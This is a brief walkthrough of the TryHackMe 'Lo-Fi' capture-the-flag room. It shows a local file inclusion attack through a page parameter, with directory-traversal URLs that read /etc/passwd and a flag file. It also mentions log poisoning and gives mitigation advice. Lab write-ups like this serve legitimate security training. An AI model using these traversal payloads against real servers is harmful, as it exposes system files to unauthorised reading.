
# Walkthrough - TryHackMe "Lo-Fi"

---

[TryHackMe | Cyber Security Training](https://tryhackme.com/room/lofi)

---

### 🛠️ **Objective: Exploit a Local File Inclusion (LFI) vulnerability to retrieve sensitive files.**

---

### 🔍 **Reconnaissance**

- The target web application is vulnerable to Local File Inclusion.  
- The goal is to exploit this weakness to read critical files on the server.

---

### 🏴 **Exploitation - LFI**

1. **Testing the vulnerability**
    - The website loads files through a `page` parameter.
    - Try to load a legitimate file first:
    
    ```text
    http://target.com/?page=about.html
    ```

2. **Traverse directories and read `/etc/passwd`**
    - If the target runs on Linux, attempt to read the list of users:
    
    ```text
    http://target.com/?page=../../../../../etc/passwd
    ```

3. **Retrieve the flag**
    - Try to access a potential flag file:
    
    ```text
    http://target.com/?page=../../../flag.txt
    ```
    
    - The flag is displayed upon successful inclusion.

---

### 🔥 **Conclusion**

- LFI vulnerabilities allow attackers to access sensitive files stored on the server.  
- This flaw can often be chained with other exploits, such as Remote Code Execution (RCE) through **log poisoning**.  
- **Mitigation:** Always validate and sanitize user inputs, apply strict whitelisting of files, and disable direct inclusion of user-controlled paths.
